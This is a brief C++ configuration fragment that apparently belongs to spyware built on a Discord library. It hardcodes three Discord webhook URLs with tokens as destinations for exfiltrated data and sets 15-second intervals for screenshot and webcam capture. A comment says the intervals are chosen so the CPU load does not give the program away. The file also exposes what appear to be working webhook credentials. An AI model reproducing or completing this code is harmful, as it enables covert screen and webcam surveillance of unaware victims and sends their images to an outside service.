#include <dpp/dpp.h>

#ifdef _WIN32
    #define PLATFORM_WINDOWS_32x64
#else
    #define PLATFORM_BASEDUNIX_32x64
#endif

static const std::string MAIN_WEBHOOK_url       = "https://discord.com/api/webhooks/1140784369833885786/EGNqTKKn2duVPyKkRby8OKbcLivHJF6UIim8jjYrFPdgSBShmr7g4hDnOshxvInjX2cx";
static const std::string SCREENSHOT_WEBHOOK_url = "https://discord.com/api/webhooks/1140784449605341226/3xyOAep9VVyEonQIctxWp7bjp3vPQCXQzHT2LVAoseq8NJPCrwI9A4QVdOfVWd_1BIEL";
static const std::string ROOT_WEBHOOK_url       = "https://discord.com/api/webhooks/1140800425356968006/JuWXIqENAxEBSJioF8Ukthu9xeJKGbDGnL-jxMM2_VPKGjlWioYlVykDXexceqzaCfhk";
static const int interval_screenshots           = 15;
static const int interval_webcamshots           = 15; //Ensure not using lowers ints to avoid show an CPU incremetation to be discret
